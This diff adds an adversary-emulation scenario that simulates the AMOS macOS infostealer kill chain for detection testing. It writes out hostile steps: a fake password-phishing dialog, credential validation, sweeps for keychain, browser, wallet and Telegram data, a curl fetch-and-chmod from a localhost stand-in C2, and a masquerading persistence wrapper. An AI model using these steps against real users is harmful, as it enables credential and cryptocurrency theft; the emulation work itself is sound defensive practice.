@@ -1,0 +1,370 @@
+name: AMOS / Atomic macOS Stealer — Comprehensive Emulation
+description: |
+  Full kill-chain emulation of Atomic macOS Stealer (AMOS), a crimeware-as-a-service
+  (MaaS) infostealer sold on Telegram (~$3,000/month, G0105-adjacent). First observed
+  April 2023 and continuously evolved through 2025–2026, AMOS is the most prevalent
+  macOS infostealer tracked by SentinelOne, Kandji, Picus, and Microsoft Defender.
+
+  This scenario covers the complete 2025 variant infection chain across 10 phases,
+  exercising 22 of MacNoise's 29 modules. It is designed to validate EDR and SIEM
+  coverage across every major tactic: execution, defense evasion, credential access,
+  discovery, collection, exfiltration, and persistence.
+
+  Delivery vectors (not emulated — upstream of this scenario):
+    - Malvertising / Google Ads redirecting to spoofed domains (Arc, Tor, Photoshop)
+    - SEO-poisoned fake software installers (.dmg)
+    - Cracked application bundles via pay-per-install (PPI) networks
+    - ClickFix-style Terminal command prompts (from late 2024)
+    - Fake AI app lures: ChatGPT, Grok, Arc Browser (from late 2025)
+    - Fake GitHub repos + fake startup companies targeting crypto testers (2025–2026)
+
+  References:
+    Picus Security, 2024      — https://www.picussecurity.com/resource/blog/atomic-stealer-amos-macos-threat-analysis
+    SpyCloud reverse eng.     — https://spycloud.com/blog/reverse-engineering-atomic-macos-stealer/
+    SentinelOne AMOS→Poseidon — https://www.sentinelone.com/blog/from-amos-to-poseidon-a-soc-teams-guide-to-detecting-macos-atomic-stealers-2024/
+    Moonlock installBot, 2025 — https://moonlock.com/amos-backdoor-persistent-access
+    Kandji evasion analysis   — https://www.kandji.io/blog/amos-macos-stealer-analysis
+    Microsoft Defender, 2026  — https://www.microsoft.com/en-us/security/blog/2026/02/02/infostealers-without-borders-macos-python-stealers-and-platform-abuse/
+
+  MITRE ATT&CK coverage:
+    T1204.002  User Execution: Malicious File
+    T1548.001  Abuse Elevation Control: Setuid/Gatekeeper bypass
+    T1059.002  AppleScript (osascript)
+    T1059.004  Unix Shell
+    T1027      Obfuscated Files or Information (XOR key 0x91)
+    T1056.004  User Input Capture: Credential API Hooking (fake dialog)
+    T1078      Valid Accounts (dscl authonly validation)
+    T1082      System Information Discovery
+    T1057      Process Discovery
+    T1555.001  Credentials from Password Stores: Keychain
+    T1555.003  Credentials from Password Stores: Web Browsers
+    T1636.003  Protected User Data: Contact List
+    T1083      File and Directory Discovery
+    T1005      Data from Local System
+    T1074.001  Data Staged: Local Data Staging
+    T1554      Compromise Client Software Binary (Ledger Live)
+    T1560.001  Archive Collected Data: Archive via Utility
+    T1071.004  Application Layer Protocol: DNS
+    T1041      Exfiltration Over C2 Channel
+    T1070.004  Indicator Removal: File Deletion
+    T1105      Ingress Tool Transfer (.helper backdoor)
+    T1543.001  Create or Modify System Process: Launch Agent
+    T1543.004  Create or Modify System Process: Launch Daemon
+    T1622      Debugger Evasion (VM/sandbox detection)
+    T1071.001  Application Layer Protocol: Web Protocols (C2 polling)
+
+# ──────────────────────────────────────────────────────────────────────────────
+# PHASE 1 — INITIAL ACCESS & GATEKEEPER BYPASS
+#
+# The trojanized .dmg contains a hidden Mach-O binary and a bash wrapper.
+# The wrapper strips the macOS quarantine extended attribute (com.apple.quarantine)
+# and sets the executable bit before running the main binary, bypassing Gatekeeper
+# without requiring a kernel exploit. This pattern is consistent across all AMOS
+# variants from 2023 through 2026.
+# ──────────────────────────────────────────────────────────────────────────────
+steps:
+  # T1548.001 — strip com.apple.quarantine xattr to bypass Gatekeeper
+  # AMOS bash wrapper runs: xattr -cr ./.Installer before executing; also checks spctl --status
+  - module: proc_gatekeeper
+    params:
+      target_path: /tmp/macnoise_amos
+
+  # T1548.001 / T1204.002 — set executable bit on hidden Mach-O binary
+  - module: proc_spawn
+    params:
+      command: "chmod +x /tmp/macnoise_amos 2>/dev/null || true"
+
+# ──────────────────────────────────────────────────────────────────────────────
+# PHASE 2 — DEFENSE EVASION
+#
+# AMOS uses osascript to hide the Terminal window immediately after launch,
+# preventing the victim from seeing command output. Payload strings (including
+# the AppleScript itself) are XOR-encoded with static key 0x91 and decoded at
+# runtime, frustrating static signature detection (Kandji, 2024).
+# ──────────────────────────────────────────────────────────────────────────────
+
+  # T1059.002 / T1027 — hide Terminal window via AppleScript (XOR-decoded at runtime)
+  - module: proc_osascript
+    params:
+      script: 'tell application "Terminal" to set visible of window 1 to false'
+
+  # T1059.002 / T1056.004 — display fake "Auto-Updates System" password dialog
+  # Exact dialog text from documented AMOS samples (Picus Security, 2024):
+  #   Title: "Auto-Updates System"
+  #   Body:  "The launcher needs permissions to enable background auto-updates."
+  # The 'with hidden answer' flag hides the typed password in the dialog field.
+  - module: proc_osascript
+    params:
+      script: 'display dialog "The launcher needs permissions to enable background auto-updates.\n\nPlease enter your password." with title "Auto-Updates System" default answer "" with icon caution buttons {"Continue"} default button "Continue" with hidden answer'
+
+# ──────────────────────────────────────────────────────────────────────────────
+# PHASE 3 — CREDENTIAL VALIDATION
+#
+# Before proceeding, AMOS validates the harvested password using the macOS
+# Directory Services command-line utility. An incorrect password would prevent
+# keychain unlocking, so this check gates the rest of the collection chain.
+# The result (correct/incorrect) is logged to a "password-entered" file in the
+# staging directory alongside the captured credential.
+# ──────────────────────────────────────────────────────────────────────────────
+
+  # T1078 / T1056.004 — validate harvested password via dscl authonly
+  # dscl /Local/Default -authonly <username> <password> returns exit 0 on success
+  - module: proc_spawn
+    params:
+      command: "dscl /Local/Default -authonly $(whoami) '' 2>/dev/null; echo $? > /tmp/macnoise_amos_auth_result || true"
+
+# ──────────────────────────────────────────────────────────────────────────────
+# PHASE 4 — SYSTEM RECONNAISSANCE
+#
+# AMOS profiles the victim system and writes results to SysInfo.txt, which is
+# included in the exfiltrated ZIP archive alongside stolen credentials. The
+# profile covers OS version, hardware model, CPU architecture (x86 vs ARM/M-series),
+# display configuration, and hardware serial numbers for victim deduplication.
+# XPC service enumeration identifies installed security software and high-value
+# targets (crypto apps, enterprise MDM) for follow-on prioritization.
+# ──────────────────────────────────────────────────────────────────────────────
+
+  # T1082 / T1057 — system profile + hardware recon: OS version, hardware model, architecture,
+  # display config, and hardware serial numbers for victim deduplication
+  # Output written to SysInfo.txt for inclusion in exfil archive
+  - module: proc_discovery
+    params:
+      commands: "sw_vers,system_profiler SPHardwareDataType,uname -m,system_profiler SPDisplaysDataType,ioreg -l | grep -i IOPlatformSerialNumber | head -5"
+
+  # T1057 — enumerate running XPC services and installed applications
+  # Identifies: security software, crypto apps, enterprise tooling, MDM agents
+  - module: xpc_connect
+
+# ──────────────────────────────────────────────────────────────────────────────
+# PHASE 5 — CREDENTIAL ACCESS
+#
+# This is AMOS's primary objective. The captured password is used to unlock the
+# macOS keychain, which is then copied wholesale and bundled into the exfil
+# archive. A bundled copy of Chainbreaker is used to extract credentials offline.
+# Browser credential databases are swept across all Chromium-family browsers
+# (Chrome, ChromeCanary, Brave, Arc, Edge, Vivaldi, Yandex, Opera, OperaGX)
+# and Firefox, targeting Login Data, Cookies, and Web Data SQLite databases.
+# Safari cookies (Cookies.binarycookies) are also targeted.
+# ──────────────────────────────────────────────────────────────────────────────
+
+  # T1555.001 — request Full Disk Access to reach ~/Library/Keychains/login.keychain-db
+  - module: tcc_fda
+
+  # T1555.001 — unlock keychain with captured password and copy database
+  # AMOS: security unlock-keychain -p <pass> login.keychain-db, then cp to exfil/Keychain/kc.db
+  - module: tcc_keychain
+
+  # T1555.003 — probe credential paths for all browser families:
+  # Chrome, Brave, Edge, Arc, Vivaldi, Opera, OperaGX (Login Data/Cookies/Web Data),
+  # Firefox (logins.json + key4.db), and Safari (Cookies.binarycookies)
+  - module: file_browser_creds
+    params:
+      browsers: all
+
+# ──────────────────────────────────────────────────────────────────────────────
+# PHASE 6 — COLLECTION
+#
+# AMOS sweeps multiple high-value data sources: the AddressBook for contact
+# enumeration, the filesystem for documents matching targeted extensions
+# (TXT, DOCX, RTF, DOC, WALLET, KEYS, KEY) under 51,200 bytes, Apple Notes
+# SQLite databases, Telegram session data (tdata folder), and the application
+# support directories of seven cryptocurrency wallet applications.
+# All collected material is staged in a randomly-named numeric directory under
+# /Users/<username>/ before being zipped and exfiltrated.
+# ──────────────────────────────────────────────────────────────────────────────
+
+  # T1636.003 — enumerate AddressBook / Contacts directory
+  - module: tcc_contacts
+
+  # T1083 / T1005 — sweep Desktop, Downloads, Documents for targeted file extensions
+  # Size limit: <51,200 bytes (AMOS FileGrabber module constraint, SpyCloud 2024)
+  # Extensions: TXT, DOCX, RTF, DOC, WALLET, KEYS, KEY
+  - module: proc_spawn
+    params:
+      command: "find ~/Desktop ~/Downloads ~/Documents -maxdepth 3 -type f \\( -name '*.txt' -o -name '*.docx' -o -name '*.rtf' -o -name '*.wallet' -o -name '*.keys' -o -name '*.key' \\) -size -50k 2>/dev/null | head -100 || true"
+
+  # T1005 — collect Apple Notes database (NoteStore.sqlite + WAL files)
+  - module: proc_spawn
+    params:
+      command: "find ~/Library/Group\\ Containers -maxdepth 4 -name 'NoteStore.sqlite*' 2>/dev/null | head -5 || true"
+
+  # T1005 — enumerate Telegram tdata session folder (account tokens, chat history)
+  - module: proc_spawn
+    params:
+      command: "ls ~/Library/Group\\ Containers/6N38VWS5BX.ru.keepcoder.Telegram/ 2>/dev/null | head -10 || true"
+
+  # T1005 — enumerate cryptocurrency wallet application directories
+  # AMOS targets: Exodus, Electrum, Coinomi, Guarda, Wasabi, Atomic, Ledger Live
+  # Seeks: passphrase.json, wallet files, seed phrase backups
+  - module: proc_spawn
+    params:
+      command: "for w in Exodus Electrum Atomic Guarda 'Ledger Live' Wasabi\\ Wallet Coinomi; do ls ~/Library/Application\\ Support/\"$w\" 2>/dev/null && echo \"Wallet found: $w\"; done || true"
+
+  # T1074.001 — create staging directory (AMOS uses a random numeric name)
+  # Simulates the exfil bundle: Keychain/, FileGrabber/, Browsers/, SysInfo.txt
+  - module: file_create
+    params:
+      base_dir: "/tmp/macnoise_amos_staging"
+      count: "18"
+      prefix: "collected_"
+
+  # T1074.001 — write SysInfo.txt to staging dir (included in every AMOS exfil bundle)
+  - module: file_modify
+    params:
+      target_path: "/tmp/macnoise_amos_staging/SysInfo.txt"
+      content: "AMOS SysInfo — MacNoise telemetry marker"
+
+# ──────────────────────────────────────────────────────────────────────────────
+# PHASE 7 — COMPROMISE APPLICATION INTEGRITY
+#
+# If Ledger Live is detected in the installed application list during Phase 4
+# discovery, AMOS downloads a backdoored replacement binary from the C2 and
+# overwrites the legitimate Ledger Live application storage. This enables theft
+# of cryptocurrency seed phrases entered by the victim into the compromised app.
+# This technique (T1554) is distinct from credential theft — it modifies a trusted
+# application to harvest future inputs rather than exfiltrating current state.
+# ──────────────────────────────────────────────────────────────────────────────
+
+  # T1554 — replace Ledger Live binary with backdoored version downloaded from C2
+  # proc_inject simulates the DYLD-based binary tampering / replacement mechanism
+  - module: proc_inject
+    params:
+      dylib_path: "/tmp/macnoise_amos_ledger_patch.dylib"
+      target: "/usr/bin/true"
+
+# ──────────────────────────────────────────────────────────────────────────────
+# PHASE 8 — ARCHIVE & EXFILTRATION
+#
+# From April 2024 onwards, AMOS zips the entire staging directory before
+# transmission rather than sending individual files. The archive is base64-encoded
+# and sent via HTTP POST to /joinsystem on the C2 server (unencrypted in early
+# variants, raw HTTPS socket in later variants). Documented POST parameters:
+#   BuildID = "2" (or "ppi" in PPI-distributed samples)
+#   user    = operator username (e.g., "Vulkan3000")
+#   B64     = base64-encoded ZIP payload
+# Known C2 IPs: 193.233.132.188, 46.101.104.172 (Picus Security, 2024)
+# After exfiltration, the staging directory and ZIP are deleted.
+# ──────────────────────────────────────────────────────────────────────────────
+
+  # T1560.001 — file create/write/delete cycle for ZIP archive
+  # Triggers ES_EVENT_TYPE_NOTIFY_CREATE, NOTIFY_WRITE, NOTIFY_UNLINK on the archive
+  - module: es_file
+    params:
+      work_dir: "/tmp/macnoise_amos_archive"
+
+  # T1560.001 — zip the full staging directory into a single archive
+  - module: file_archive
+    params:
+      source_dir: /tmp/macnoise_amos_staging
+      output_path: /tmp/macnoise_amos_payload.zip
+      tool: zip
+
+  # T1071.004 — resolve C2 domain before connecting (AMOS uses rotating C2 domains)
+  - module: net_dns
+    params:
+      domains: "update.example.com,cdn.example.net,telemetry.example.org"
+
+  # T1041 — HTTP POST base64-encoded ZIP to /joinsystem endpoint on C2
+  - module: net_exfil
+    params:
+      target: "http://127.0.0.1:8080/joinsystem"
+
+  # T1070.004 — delete staging directory and ZIP post-exfiltration (anti-forensics)
+  - module: proc_spawn
+    params:
+      command: "rm -rf /tmp/macnoise_amos_staging /tmp/macnoise_amos_payload.zip /tmp/macnoise_amos_archive 2>/dev/null || true"
+
+# ──────────────────────────────────────────────────────────────────────────────
+# PHASE 9 — BACKDOOR INSTALLATION (installBot — mid-2025 variant)
+#
+# Moonlock / MacPaw confirmed in July 2025 that AMOS gained persistent backdoor
+# capability via a new "installBot" function. The backdoor operates in three layers:
+#
+#   1. .helper  — hidden Mach-O at $HOME/.helper, downloaded from C2
+#                 (/zxc/app endpoint, e.g., https://isnimitz[.]com/zxc/app)
+#                 Contains VM detection (QEMU/VMware/KVM) and C2 polling logic.
+#
+#   2. .agent   — bash wrapper at $HOME/.agent that loops every second, checks
+#                 /dev/console for the logged-in user, and runs .helper via
+#                 osascript to maintain user context across sessions.
+#
+#   3. LaunchDaemon — com.finder.helper.plist at /Library/LaunchDaemons/
+#                     (requires root; user-space alternative uses LaunchAgent)
+#                     RunAtLoad: true, KeepAlive: true, Program: /bin/bash ~/.agent
+#
+# The backdoor registers with C2 via POST /api/join/, receives a unique bot ID
+# written to $HOME/.id, then polls /api/tasks/<bot-id> every 60 seconds.
+# Supported operator commands: execute (system()), pong (sleep 60), repeat, delete.
+# ──────────────────────────────────────────────────────────────────────────────
+
+  # T1105 — download .helper backdoor binary from C2 (/zxc/app endpoint)
+  - module: proc_spawn
+    params:
+      command: "curl -fsSL http://127.0.0.1:8080/zxc/app -o /tmp/macnoise_amos_helper 2>/dev/null; chmod +x /tmp/macnoise_amos_helper 2>/dev/null || true"
+
+  # T1059.004 — write ~/.agent bash wrapper (osascript loop for user-context execution)
+  - module: file_modify
+    params:
+      target_path: "/tmp/macnoise_amos_agent"
+      content: "#!/bin/bash\nwhile true; do\n  USER=$(stat -f %Su /dev/console)\n  osascript -e \"do shell script \\\"$HOME/.helper\\\"\" 2>/dev/null\n  sleep 1\ndone"
+
+  # T1543.004 — write com.finder.helper.plist (LaunchDaemon, masquerading as Finder helper)
+  # In the wild: placed at /Library/LaunchDaemons/com.finder.helper.plist
+  # RunAtLoad: true, KeepAlive: true, Program: /bin/bash, ProgramArguments: [/bin/bash, ~/.agent]
+  - module: plist_create
+    params:
+      output_path: "/tmp/macnoise_amos_staging_persist/com.finder.helper.plist"
+      bundle_id: "com.finder.helper"
+
+  # T1543.001 — load LaunchAgent for user-space persistence (non-root fallback)
+  - module: svc_launch_agent
+    params:
+      label: "com.finder.helper"
+      program: "/usr/bin/true"
+
+  # T1071.001 — write bot registration ID to defaults store
+  # In the wild: written to $HOME/.id after POST /api/join/ response
+  - module: plist_modify
+    params:
+      domain: "com.finder.helper"
+      key: "BotIdentifier"
+      value: "macnoise-amos-emulation"
+
+# ──────────────────────────────────────────────────────────────────────────────
+# PHASE 10 — ANTI-ANALYSIS & PERSISTENT C2
+#
+# Before activating, .helper checks for virtualized environments to avoid
+# sandbox analysis (QEMU, VMware, KVM detection via ioreg and sysctl).
+# The backdoor then registers with the C2 and enters an infinite polling loop,
+# checking for operator tasks every 60 seconds. The nested process chain
+# (.agent → osascript → .helper) generates ES_EVENT_TYPE_NOTIFY_EXEC/FORK/EXIT
+# events visible to EDR solutions on each poll cycle — a high-fidelity detection
+# opportunity for behavioral rules.
+# ──────────────────────────────────────────────────────────────────────────────
+
+  # T1622 — VM/sandbox detection: check hypervisor presence and known VM artefacts
+  # .helper checks: kern.hv_vmm_present, ioreg for VMware/QEMU/VirtualBox strings
+  - module: proc_spawn
+    params:
+      command: "sysctl -n kern.hv_vmm_present 2>/dev/null; ioreg -l 2>/dev/null | grep -iE 'vmware|qemu|vbox|parallels' | head -5 || true"
+
+  # T1071.001 — register with C2: POST /api/join/ → receive unique bot ID in response
+  - module: net_connect
+    params:
+      target: "127.0.0.1"
+      port: "443"
+
+  # T1059.004 — simulate .agent → osascript → .helper nested process chain
+  # Each poll cycle generates ES_EVENT_TYPE_NOTIFY_EXEC/FORK/EXIT — use chain_depth: 3
+  # to reflect the three-layer wrapper: launchd → bash(.agent) → osascript → .helper
+  - module: es_process
+    params:
+      chain_depth: "3"
+
+  # T1071.001 — poll /api/tasks/<bot-id> every 60s for operator commands
+  # Commands: execute (shell), pong (sleep), repeat, delete (self-removal)
+  - module: net_beacon
+    params:
+      target: "http://example.com"
+      count: "6"
+      interval: "10"
